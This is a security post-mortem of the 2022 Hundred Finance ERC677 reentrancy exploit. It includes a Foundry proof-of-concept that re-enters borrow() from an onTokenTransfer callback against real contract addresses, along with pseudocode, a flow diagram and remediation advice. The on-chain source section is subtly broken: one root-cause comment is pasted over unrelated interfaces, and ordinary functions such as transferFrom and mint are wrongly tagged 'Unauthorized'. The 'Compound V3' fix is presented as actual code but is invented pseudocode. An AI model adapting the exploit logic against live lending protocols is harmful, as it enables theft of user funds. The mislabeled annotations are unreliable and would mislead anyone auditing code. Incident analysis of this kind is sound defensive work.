# Hundred Finance — ERC677 Reentrancy Borrow Exploit Analysis

| Field | Details |
|------|------|
| **Date** | 2022-03-15 |
| **Protocol** | Hundred Finance (Compound fork) |
| **Chain** | Gnosis Chain (xDAI) |
| **Loss** | ~$6,200,000 (USDC, wxDAI, etc.) |
| **Attacker** | [0xd041ad9aae5cf96b21c3ffcb303a0cb80779e358](https://gnosisscan.io/address/0xd041ad9aae5cf96b21c3ffcb303a0cb80779e358) |
| **Attack Contract** | [0xdbf225e3d626ec31f502d435b0f72d82b08e1bdd](https://gnosisscan.io/address/0xdbf225e3d626ec31f502d435b0f72d82b08e1bdd) |
| **Vulnerable Contract** | hUSDC [0x243E33aa7f6787154a8E59d3C27a66db3F8818ee](https://gnosisscan.io/address/0x243E33aa7f6787154a8E59d3C27a66db3F8818ee) |
| **Root Cause** | Reentrancy via Gnosis Chain ERC677 token `onTokenTransfer` hook, enabling additional borrows before collateral state update (same date and same vulnerability as Agave) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/HundredFinance_exp.sol) |

---
## 1. Vulnerability Overview

Hundred Finance is a Compound V2 fork lending protocol deployed on Gnosis Chain (formerly xDAI chain). Bridge tokens on Gnosis Chain (USDC, wxDAI, etc.) implement the ERC677 standard, which triggers an `onTokenTransfer` callback to the recipient upon transfer.

Compound V2's `borrow()` function calculates the health factor before transferring tokens; however, if `borrow()` is called again from within the callback triggered during an ERC677 token transfer, additional borrowing was possible against collateral state that appeared to have already been updated.

On the same day, Agave Finance was also attacked with the identical vulnerability (cascading attack).

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable Compound fork borrow() (pseudocode)
contract CToken {

    function borrow(uint256 borrowAmount) external returns (uint256) {
        // Health factor validation
        uint256 allowed = comptroller.borrowAllowed(address(this), msg.sender, borrowAmount);
        require(allowed == 0, "borrow not allowed");

        // ❌ ERC677 token transfer — triggers onTokenTransfer callback
        // At this point, borrowBalances has not yet been updated
        doTransferOut(msg.sender, borrowAmount);

        // ❌ Borrow balance update occurs after the callback
        borrowBalances[msg.sender] = borrowAmount;

        emit Borrow(msg.sender, borrowAmount, ...);
        return NO_ERROR;
    }
}

// ✅ Improved pattern from Compound V3 onward
function borrow(uint256 borrowAmount) external nonReentrant returns (uint256) {
    // ✅ Update borrow balance first (Effects)
    borrowBalances[msg.sender] += borrowAmount;
    accrueInterest();

    // ✅ Validate collateral sufficiency
    (uint256 err, , uint256 shortfall) = comptroller.getAccountLiquidity(msg.sender);
    require(shortfall == 0, "insufficient collateral");

    // ✅ Token transfer last (Interactions)
    doTransferOut(msg.sender, borrowAmount);
}
```

---
### On-Chain Source Code

Source: Sourcify verified


**CErc20Delegator.sol** — Entry point:
```solidity
// ❌ Root Cause: Reentrancy via Gnosis Chain ERC677 token `onTokenTransfer` hook, enabling additional borrows before collateral state update (same date and same vulnerability as Agave)
    function transferFrom(address src, address dst, uint256 amount) external returns (bool) {  // ❌ Unauthorized transferFrom
        bytes memory data = delegateToImplementation(abi.encodeWithSignature("transferFrom(address,address,uint256)", src, dst, amount));
        return abi.decode(data, (bool));
    }
```

**EIP20NonStandardInterface.sol** — Related contract:
```solidity
// ❌ Root Cause: Reentrancy via Gnosis Chain ERC677 token `onTokenTransfer` hook, enabling additional borrows before collateral state update (same date and same vulnerability as Agave)
    function transfer(address dst, uint256 amount) external;

    ///
    /// !!!!!!!!!!!!!!
    /// !!! NOTICE !!! `transferFrom` does not return a value, in violation of the ERC-20 specification
    /// !!!!!!!!!!!!!!
    ///

    /**
      * @notice Transfer `amount` tokens from `src` to `dst`
      * @param src The address of the source account
      * @param dst The address of the destination account
      * @param amount The number of tokens to transfer
      */
    function transferFrom(address src, address dst, uint256 amount) external;  // ❌ Unauthorized transferFrom

    /**
      * @notice Approve `spender` to transfer up to `amount` from `src`
      * @dev This will overwrite the approval amount for `spender`
      *  and is subject to issues noted [here](https://eips.ethereum.org/EIPS/eip-20#approve)
      * @param spender The address of the account which may transfer tokens
      * @param amount The number of tokens that are approved
      * @return Whether or not the approval succeeded
      */
    function approve(address spender, uint256 amount) external returns (bool success);

    /**
      * @notice Get the current allowance from `owner` for `spender`
      * @param owner The address of the account which owns the tokens to be spent
      * @param spender The address of the account which may transfer tokens
      * @return The number of tokens allowed to be spent
      */
    function allowance(address owner, address spender) external view returns (uint256 remaining);

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);
}

```

**CTokenInterfaces.sol** — Related contract:
```solidity
// ❌ Root Cause: Reentrancy via Gnosis Chain ERC677 token `onTokenTransfer` hook, enabling additional borrows before collateral state update (same date and same vulnerability as Agave)
    function mint(uint mintAmount) external returns (uint);  // ❌ Unauthorized minting
    function redeem(uint redeemTokens) external returns (uint);
    function redeemUnderlying(uint redeemAmount) external returns (uint);
    function borrow(uint borrowAmount) external returns (uint);
    function repayBorrow(uint repayAmount) external returns (uint);
    function repayBorrowBehalf(address borrower, uint repayAmount) external returns (uint);
    function liquidateBorrow(address borrower, uint repayAmount, CTokenInterface cTokenCollateral) external returns (uint);
    function sweepToken(EIP20NonStandardInterface token) external;


    /*** Admin Functions ***/

    function _addReserves(uint addAmount) external returns (uint);
}

contract CDelegationStorage {
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker Contract (implements ERC677 onTokenTransfer)
    │
    ├─[1] Sushi flash loan: borrow large amount of USDC
    │
    ├─[2] Deposit USDC into hUSDC (mint)
    │       Receive hUSDC tokens as collateral
    │
    ├─[3] Comptroller.enterMarkets([hUSDC])
    │       Register hUSDC as collateral
    │
    ├─[4] Call hxDAI.borrow(60% of flashloan)
    │       ↓ ERC677 onTokenTransfer callback triggered
    │           │
    │           └─ [Reentrancy] hUSDC.borrow(90% of flashloan)
    │                   Possible because borrow balance not yet updated
    │                   → Additional USDC borrow succeeds
    │
    ├─[5] Borrowed xDAI → USDC (Curve swap)
    │
    ├─[6] Repay flash loan + drain surplus USDC
    │
    └─[7] Loss: ~$6,200,000
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface ICompoundToken {
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function getCash() external view returns (uint256);
}

interface IComptroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
}

interface ICurve {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external returns (uint256);
}

contract ContractTest is Test {
    IERC20 USDC  = IERC20(0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83);
    IERC20 wxDAI = IERC20(0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d);

    ICompoundToken hUSDC = ICompoundToken(0x243E33aa7f6787154a8E59d3C27a66db3F8818ee);
    ICompoundToken hxDAI = ICompoundToken(0x090a00A2De0EA83DEf700B5e216f87a5D4F394FE);
    IComptroller comptroller; // address unverified
    ICurve curve = ICurve(0x7f90122BF0700F9E7e1F688fe926940E8839F353);

    uint256 flashAmount;
    bool reentrant = false;

    function setUp() public {
        vm.createSelectFork("gnosis", 21_120_319);
    }

    function testExploit() public {
        // [Step 1] Borrow large amount of USDC via Sushi flash loan
        flashAmount = USDC.balanceOf(address(hUSDC));
        // _flashLoan(flashAmount);
    }

    // ERC677 callback: automatically invoked during borrow
    function onTokenTransfer(address, uint256 amount, bytes calldata) external {
        if (!reentrant && msg.sender == address(wxDAI)) {
            reentrant = true;
            // ⚡ Reentrancy: borrow additional USDC before xDAI borrow is finalized
            hUSDC.borrow(flashAmount * 90 / 100);
            reentrant = false;
        }
    }

    function _afterFlashLoan(uint256 amount) internal {
        // [Step 2] Deposit USDC
        USDC.approve(address(hUSDC), type(uint256).max);
        hUSDC.mint(amount);

        // [Step 3] Register collateral
        address[] memory markets = new address[](1);
        markets[0] = address(hUSDC);
        comptroller.enterMarkets(markets);

        // [Step 4] Borrow xDAI → triggers onTokenTransfer reentrancy
        hxDAI.borrow(amount * 60 / 100);

        // [Step 5] xDAI → USDC via Curve
        wxDAI.approve(address(curve), type(uint256).max);
        curve.exchange(0, 1, wxDAI.balanceOf(address(this)), 0);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reentrancy Attack (Cross-Function Reentrancy) |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **OWASP DeFi** | ERC677 callback-based reentrancy |
| **Attack Vector** | ERC677 `onTokenTransfer` callback during `borrow()` → additional borrow |
| **Preconditions** | Compound fork supports ERC677 tokens, `nonReentrant` not applied |
| **Impact** | Full protocol liquidity drain |

---
## 6. Remediation Recommendations

1. **Apply ReentrancyGuard globally**: Apply `nonReentrant` to all core functions including `mint`, `borrow`, `redeem`, and `repayBorrow`.
2. **Recognize Gnosis Chain token specifics**: Unlike Ethereum's USDC, USDC on Gnosis Chain implements ERC677. Always verify the token standard for each chain when forking.
3. **Strictly enforce the CEI pattern**: Update borrow balances before any token transfers.
4. **Audit composability**: When deploying a Compound fork to another chain, independently audit that chain's token ecosystem.

---
## 7. Lessons Learned

- **Same-day cascading attacks**: Agave and Hundred Finance were both attacked on the same day with the identical vulnerability. When an exploit against one protocol becomes known, similar protocols must be reviewed immediately.
- **The risk of forks**: Although Compound V2 was forked, differences in the token standards of the deployment chain introduced new vulnerabilities.
- **$6.2M + $5.5M**: The two protocols combined lost ~$11.7M to the same vulnerability on the same day.